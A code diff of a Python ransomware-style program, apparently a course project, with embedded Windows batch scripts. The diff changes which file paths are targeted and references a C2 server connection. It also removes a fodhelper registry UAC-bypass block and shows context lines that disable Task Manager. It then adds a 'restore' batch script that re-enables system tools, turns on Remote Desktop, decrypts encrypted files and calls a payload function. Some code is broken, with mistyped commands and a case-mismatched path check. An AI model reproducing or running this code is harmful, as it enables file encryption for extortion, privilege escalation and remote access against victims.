@@ -86,7 +86,7 @@ def load_file_paths():
         for name in files:
             path = os.path.join(root, name)
             global file_paths
-            if "cecs378" not in path.lower() and "python" not in path.lower():
+            if "LockDownBrowserInstaller" not in path.lower() and "python" not in path.lower():
                 file_paths.append(os.path.join(root, name))
 
 # C2 Server Connection
@@ -191,10 +191,6 @@ if %errorlevel% neq 0 (
     exit /b
 )
 
-New-Item “HKCU:\Software\Classes\ms-settings\Shell\Open\command” -Force
-New-ItemProperty -Path “HKCU:\Software\Classes\ms-settings\Shell\Open\command” -Name “DelegateExecute” -Value “” -Force
-et-ItemProperty -Path “HKCU:\Software\Classes\ms-settings\Shell\Open\command” -Name “(default)” -Value $custom -Force
-
 Start Process "C\Windows\System32\fodhelper.exe"
 :: Disable Task Manager
 echo Disabling Task Manager...
@@ -244,7 +240,6 @@ if %errorlevel% neq 0 (
 '''
 # Path where the batch file will be created
 batch_file = 'admin_script.bat'
-print("Just created the ad bat")
 
 # Create the batch file
 with open(batch_file, 'w') as f:
@@ -288,3 +283,63 @@ with open('./encrypted_files.txt', 'r') as files:
         decrypt_file(d_line, d_line, decrypted_aes)
 
 
+# The content of the batch file that will be executed with administrator privileges
+batch_content = r'''@echo off
+:: Check if the script is running as administrator
+NET SESSION >nul 2>&1
+if %errorlevel% neq 0 (
+    echo This script is not running as Administrator. Restarting with elevated privileges...
+    powershell -Command "Start-Process cmd -ArgumentList '/c', '%~f0' -Verb runAs"
+    exit /b
+)
+
+:: Enable Task Manager
+echo Enabling Task Manager...
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f
+
+:: Enable Command Prompt
+echo Enabling Command Prompt...
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /f
+reg delete "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /f
+
+:: Enable PowerShell
+echo Enabling PowerShell...
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePowershell /f
+reg delete "HKCU\Software\Policies\Microsoft\Windows\System" /v DisablePowershell /f
+
+:: Allow running cmd.exe and powershell.exe
+echo Allowing cmd.exe and powershell.exe...
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisallowRun /f
+
+:: Restore access to taskkill.exe
+echo Restoring taskkill.exe permissions...
+icacls "C:\Windows\System32\taskkill.exe" /reset /T
+
+:: Enable Windows Key
+echo Enabling Windows Key...
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /f
+
+:: Refresh Explorer to apply changes immediately
+taskkill /im explorer.exe /f >nul 2>&1
+start explorer.exe
+
+:: Enable Remote Desktop
+echo Enabling Remote Desktop...
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+:: Enable Registry Editor
+echo Enabling Registry Editor...
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /f
+
+echo All settings have been restored.
+
+'''
+# Path where the batch file will be created
+batch_file = 'admin_script.bat'
+
+# Create the batch file
+with open(batch_file, 'w') as f:
+    f.write(batch_content)
+
+windows_payload()
